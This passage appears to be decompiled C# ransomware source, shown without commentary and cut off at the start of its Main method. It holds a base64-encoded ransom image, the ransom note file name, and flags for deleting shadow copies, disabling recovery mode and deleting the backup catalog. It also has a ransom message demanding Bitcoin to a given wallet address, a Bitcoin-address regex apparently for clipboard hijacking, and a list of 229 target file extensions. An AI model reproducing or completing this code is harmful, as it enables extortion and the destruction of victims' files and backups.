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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[5] { "Ooops! Your files are encrypted. To recover them, donate the following amount to this Bitcoin adress:", "", "Amount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
